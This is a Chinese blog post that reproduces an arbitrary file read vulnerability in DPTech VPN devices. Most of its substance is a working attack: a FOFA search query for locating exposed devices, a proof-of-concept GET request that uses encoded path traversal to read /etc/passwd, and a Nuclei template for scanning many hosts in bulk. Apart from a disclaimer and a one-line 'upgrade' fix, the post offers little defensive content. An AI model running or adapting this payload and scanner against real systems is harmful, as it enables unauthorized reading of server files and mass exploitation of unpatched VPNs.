# 原创
：  漏洞复现--迪普DPTech VPN 任意文件读取

# 漏洞复现--迪普DPTech VPN 任意文件读取

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

杭州迪普科技股份有限公司DPTech VPN 存在任意文件读取漏洞，攻击者可以构造恶意请求，通过漏洞读取服务器上的任意文件。

### 二：漏洞影响版本

DPTech VPN

### 三：网络空间测绘查询

fofa:<br/> `cert="DPtechCa"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/bdbf666a19732a5172caa58fc7f9c000.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e9931b85d8421888c53502f27298166d.jpeg"/><br/> POC:

```
GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2e298c77dcba6cdcc43136b75a5f9aa0.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/46924d8bea5fec014421d8ee3cd8c1ca.jpeg"/>

### 五：批量检测

```

id: dptech-vpn-fileread

info:
  name: dp-vpn-fileread
  author: rain
  severity: high
  description: DPtech SSL VPN 服务存在一个文件读取漏洞，攻击者可以通过利用此漏洞读取目标系统上的敏感文件。该漏洞可能导致未经授权的信息泄露，危及系统的机密性和完整性。
  metadata: 
    fofa-query: title=="SSL VPN Service" &amp;&amp; header="Dptech" || cert="DPtechCa"

http:
  - raw:
      - |     
        GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 &amp;&amp; contains_all(body,"root")'

```

### 六：修复建议

升级到最新版本
